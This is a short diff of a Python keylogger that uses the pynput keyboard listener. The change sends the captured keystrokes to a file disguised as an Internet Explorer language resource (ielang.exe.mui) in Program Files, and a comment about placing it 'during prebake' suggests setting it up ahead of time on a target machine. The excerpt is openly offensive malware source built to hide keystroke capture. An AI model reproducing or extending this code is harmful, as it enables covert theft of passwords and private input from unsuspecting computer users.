@@ -2,7 +2,7 @@ from pynput import keyboard
 
 # Define the file to save the keystrokes
 #Consider C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui
-output_file = "keystrokes.txt" #FIND A PLACE FOR THIS DURING PREBAKE
+output_file = "C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui" #FIND A PLACE FOR THIS DURING PREBAKE
 
 def on_press(key):
     try:
